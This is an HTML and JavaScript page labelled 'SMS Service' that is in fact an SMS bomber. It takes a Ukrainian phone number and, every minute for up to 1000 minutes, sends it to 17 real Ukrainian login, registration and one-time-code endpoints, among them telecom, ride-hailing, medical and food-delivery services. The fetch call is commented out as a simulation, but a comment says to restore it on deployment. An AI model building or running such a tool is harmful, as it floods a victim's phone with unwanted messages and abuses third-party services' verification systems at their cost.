<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Service</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: #fff;
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 1.5rem;
            color: #fff;
        }

        .input-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }

        label {
            display: block;
            font-size: 1rem;
            margin-bottom: 0.5rem;
            color: #e0e0e0;
        }

        input {
            width: 100%;
            padding: 0.75rem;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: background 0.3s;
        }

        input:focus {
            background: rgba(255, 255, 255, 0.3);
        }

        input::placeholder {
            color: #b0b0b0;
        }

        .button-group {
            display: flex;
            gap: 1rem;
        }

        button {
            flex: 1;
            padding: 0.75rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.3s, transform 0.2s;
        }

        #startBtn {
            background: #22c55e;
            color: #fff;
        }

        #startBtn:hover {
            background: #16a34a;
            transform: translateY(-2px);
        }

        #stopBtn {
            background: #ef4444;
            color: #fff;
        }

        #stopBtn:hover {
            background: #dc2626;
            transform: translateY(-2px);
        }

        #status {
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #e0e0e0;
        }

        .error {
            color: #f87171;
            font-size: 0.9rem;
            margin-top: 0.5rem;
        }

        @media (max-width: 480px) {
            .container {
                padding: 1.5rem;
                margin: 1rem;
            }

            h1 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SMS Service</h1>
        <div class="input-group">
            <label for="phone">Phone Number (+380)</label>
            <input type="tel" id="phone" placeholder="+380123456789" maxlength="13">
            <div id="phoneError" class="error"></div>
        </div>
        <div class="input-group">
            <label for="duration">Duration (1-1000 minutes)</label>
            <input type="number" id="duration" placeholder="Enter minutes" min="1" max="1000">
            <div id="durationError" class="error"></div>
        </div>
        <div class="button-group">
            <button id="startBtn">Start</button>
            <button id="stopBtn" disabled>Stop</button>
        </div>
        <div id="status">Status: Idle</div>
    </div>

    <script>
        const APIs = [
            'https://anc.ua/authorization/auth/v2/register',
            'https://ucb.z.apteka24.ua/api/send/otp',
            'https://barsgroup.com.ua/api/sendSms',
            'https://bi.ua/api/v1/accounts',
            'https://pwa-api.eva.ua/api/user/send-code?storeCode=ua',
            'https://medics.ua/api/v1/verifications',
            'https://rider.uklon.com.ua/api/v1/phone/send-code',
            'https://registration.vodafone.ua/api/v1/process/smsCode',
            'https://pizzaday.eatery.club/site/v1/pre-login',
            'https://helsi.me/api/healthy/v2/accounts/login',
            'https://helsi.me/api/healthy/v2/accounts/send',
            'https://auth2.multiplex.ua/login',
            'https://comfy.ua/api/auth/password/dynamic',
            'https://prontopizza.ua/wp-admin/admin-ajax.php',
            'https://vilki-palki.od.ua/api/secret/generate?lang=ukrainian',
            'https://pomidoros.com.ua/wp-content/themes/pomidoros/includes/register_login.php',
            'https://www.sushiya.ua/api/v1/user/auth'
        ];

        const phoneInput = document.getElementById('phone');
        const durationInput = document.getElementById('duration');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const status = document.getElementById('status');
        const phoneError = document.getElementById('phoneError');
        const durationError = document.getElementById('durationError');

        let intervalId = null;
        let endTime = null;

        function validatePhone(phone) {
            const regex = /^\+380[5-9][0-9]{8}$/;
            return regex.test(phone);
        }

        function validateDuration(duration) {
            const num = parseInt(duration);
            return num >= 1 && num <= 1000;
        }

        function updateStatus(message) {
            status.textContent = `Status: ${message}`;
        }

        async function sendRequest(api, phone) {
            try {
                // Simulate API call (replace with actual fetch when deploying)
                console.log(`Sending request to ${api} with phone ${phone}`);
                // Example fetch (commented out for simulation):
                /*
                const response = await fetch(api, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });
                if (!response.ok) throw new Error(`Failed to send to ${api}`);
                */
                return true;
            } catch (error) {
                console.error(`Error with ${api}:`, error);
                return false;
            }
        }

        async function sendToAllAPIs(phone) {
            const promises = APIs.map(api => sendRequest(api, phone));
            const results = await Promise.all(promises);
            const successCount = results.filter(success => success).length;
            updateStatus(`Sent to ${successCount}/${APIs.length} APIs`);
        }

        function startSending() {
            const phone = phoneInput.value.trim();
            const duration = parseInt(durationInput.value);

            phoneError.textContent = '';
            durationError.textContent = '';

            if (!validatePhone(phone)) {
                phoneError.textContent = 'Please enter a valid Ukrainian phone number (+380xxxxxxxxx)';
                return;
            }

            if (!validateDuration(duration)) {
                durationError.textContent = 'Please enter a duration between 1 and 1000 minutes';
                return;
            }

            startBtn.disabled = true;
            stopBtn.disabled = false;
            phoneInput.disabled = true;
            durationInput.disabled = true;

            endTime = Date.now() + duration * 60 * 1000;
            updateStatus('Sending requests...');

            // Send immediately
            sendToAllAPIs(phone);

            // Set interval to send every minute
            intervalId = setInterval(() => {
                if (Date.now() >= endTime) {
                    stopSending();
                    return;
                }
                sendToAllAPIs(phone);
            }, 60 * 1000);
        }

        function stopSending() {
            if (intervalId) {
                clearInterval(intervalId);
                intervalId = null;
            }
            startBtn.disabled = false;
            stopBtn.disabled = true;
            phoneInput.disabled = false;
            durationInput.disabled = false;
            updateStatus('Stopped');
        }

        startBtn.addEventListener('click', startSending);
        stopBtn.addEventListener('click', stopSending);

        // Clear error messages on input
        phoneInput.addEventListener('input', () => phoneError.textContent = '');
        durationInput.addEventListener('input', () => durationError.textContent = '');
    </script>
</body>
</html>